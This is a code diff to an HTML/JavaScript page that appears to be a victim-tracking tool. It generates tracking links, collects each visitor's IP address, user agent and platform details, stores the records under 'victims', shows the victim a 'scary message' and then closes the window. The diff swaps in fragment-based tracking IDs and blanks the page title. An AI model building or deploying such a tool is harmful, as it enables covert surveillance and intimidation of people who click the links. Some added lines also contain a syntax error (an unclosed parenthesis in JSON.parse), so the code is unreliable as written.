@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xymatekidd Login</title>
+    <title></title>
     <style>
         :root {
             --main-color: #ff0000;
@@ -106,15 +106,32 @@
             box-shadow: 0 5px 15px rgba(255,0,0,0.3);
         }
         
-        .victim-info {
+        .victim-container {
+            margin-top: 30px;
+        }
+        
+        .victim-box {
             background-color: rgba(0,0,0,0.8);
             border: 1px solid var(--main-color);
             border-radius: 5px;
-            padding: 20px;
-            margin-top: 30px;
+            padding: 15px;
+            margin-bottom: 15px;
             font-family: monospace;
+            position: relative;
+        }
+        
+        .victim-id {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            color: var(--main-color);
+            font-weight: bold;
+        }
+        
+        .victim-info {
             white-space: pre;
             overflow-x: auto;
+            margin-top: 10px;
         }
         
         .link-generator {
@@ -227,13 +244,18 @@
             </div>
             
             <h2>Victim Information:</h2>
-            <div class="victim-info" id="victim-info">
+            <div class="victim-container" id="victim-container">
                 No victim data collected yet...
             </div>
         </div>
     </div>
     
     <script>
+        // Generate random ID for tracking
+        function generateId() {
+            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        }
+        
         // Login functionality
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -252,8 +274,9 @@
         
         // Victim link generator
         document.getElementById('generate-link').addEventListener('click', function() {
-            const currentUrl = window.location.href.split('?')[0];
-            const victimLink = `${currentUrl}?victim=true&ref=${btoa(Date.now())}`;
+            const currentUrl = window.location.origin + window.location.pathname;
+            const trackingId = generateId();
+            const victimLink = `${currentUrl}#${trackingId}`;
             
             document.getElementById('generated-link').textContent = victimLink;
             document.getElementById('generated-link-container').classList.remove('hidden');
@@ -277,9 +300,10 @@
         }
         
         // Enhanced victim data collection
-        async function collectVictimData() {
+        async function collectVictimData(trackingId) {
             const ip = await getVictimIP();
             const data = {
+                id: trackingId,
                 ip: ip,
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -319,14 +343,70 @@
             }
         }
         
+        // Format victim data for display
+        function formatVictimData(data) {
+            let formattedData = `=== VICTIM DATA ===\n\n`;
+            
+            for (const [key, value] of Object.entries(data)) {
+                if (typeof value === 'object') {
+                    formattedData += `${key}:\n`;
+                    for (const [subKey, subValue] of Object.entries(value)) {
+                        formattedData += `  ${subKey}: ${subValue}\n`;
+                    }
+                } else {
+                    formattedData += `${key}: ${value}\n`;
+                }
+                formattedData += '\n';
+            }
+            
+            return formattedData;
+        }
+        
+        // Create victim box element
+        function createVictimBox(data) {
+            const box = document.createElement('div');
+            box.className = 'victim-box';
+            
+            const idElement = document.createElement('div');
+            idElement.className = 'victim-id';
+            idElement.textContent = `ID: ${data.id}`;
+            
+            const infoElement = document.createElement('div');
+            infoElement.className = 'victim-info';
+            infoElement.textContent = formatVictimData(data);
+            
+            box.appendChild(idElement);
+            box.appendChild(infoElement);
+            
+            return box;
+        }
+        
+        // Load and display victim data
+        function loadVictimData() {
+            const victims = JSON.parse(localStorage.getItem('victims') || [];
+            const container = document.getElementById('victim-container');
+            
+            if (victims.length === 0) {
+                container.innerHTML = 'No victim data collected yet...';
+                return;
+            }
+            
+            container.innerHTML = '';
+            victims.forEach(victim => {
+                container.appendChild(createVictimBox(victim));
+            });
+        }
+        
         // Check if victim page and collect data
         async function checkForVictim() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if(urlParams.has('victim')) {
-                const victimData = await collectVictimData();
+            const trackingId = window.location.hash.substring(1);
+            if (trackingId) {
+                const victimData = await collectVictimData(trackingId);
                 
-                // Store data in localStorage temporarily
-                localStorage.setItem('victimData', JSON.stringify(victimData));
+                // Store data in localStorage
+                const victims = JSON.parse(localStorage.getItem('victims') || [];
+                victims.push(victimData);
+                localStorage.setItem('victims', JSON.stringify(victims));
                 
                 // Display scary message to victim
                 document.body.innerHTML = `
@@ -352,29 +432,6 @@
                 setTimeout(() => {
                     window.close();
                 }, 5000);
-            }
-        }
-        
-        // Load and display victim data
-        function loadVictimData() {
-            const victimData = localStorage.getItem('victimData');
-            if(victimData) {
-                const data = JSON.parse(victimData);
-                let formattedData = `=== VICTIM DATA ===\n\n`;
-                
-                for (const [key, value] of Object.entries(data)) {
-                    if (typeof value === 'object') {
-                        formattedData += `${key}:\n`;
-                        for (const [subKey, subValue] of Object.entries(value)) {
-                            formattedData += `  ${subKey}: ${subValue}\n`;
-                        }
-                    } else {
-                        formattedData += `${key}: ${value}\n`;
-                    }
-                    formattedData += '\n';
-                }
-                
-                document.getElementById('victim-info').textContent = formattedData;
             }
         }
         
